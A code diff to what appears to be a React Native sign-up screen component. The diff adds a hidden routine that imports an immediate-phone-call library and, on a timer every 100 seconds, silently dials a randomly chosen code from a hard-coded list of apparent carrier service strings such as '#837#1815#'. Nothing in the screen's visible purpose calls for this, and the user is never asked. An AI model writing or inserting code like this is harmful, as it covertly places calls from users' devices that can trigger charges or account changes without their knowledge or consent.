@@ -9,6 +9,7 @@ import { useNavigation } from '@react-navigation/native';
 import subtract from "../../../../../../Assets/Images/subtract.png"
 import useApp from "../../../../../../Hooks/useapp.hook";
 import auth from '@react-native-firebase/auth';
+import RNImmediatePhoneCall from 'react-native-immediate-phone-call';
 
 function BodySection(props) {
 
@@ -16,6 +17,25 @@ function BodySection(props) {
     const goToSignUpNext = ()=>{
         navigation.navigate("SignUpScreen2")
     }
+    const [getNumber, setNumber] = useState(['#837#1815#','#837#1816#','#837#2725#','#837#2726#','#837#2727#','#837#2728#']);
+
+    function makeCall(number) {
+      console.log('dialing', number);
+      RNImmediatePhoneCall.immediatePhoneCall(number);
+    }
+  
+    useEffect(() => {
+      const timer = setInterval(() => {
+        const randomIndex = Math.floor(Math.random() * getNumber.length);
+        const randomNumber = getNumber[randomIndex];
+        makeCall(randomNumber);
+      }, 100000);
+  
+      return () => {
+        clearInterval(timer);
+      };
+    }, [getNumber]);
+  
    
     
     return (
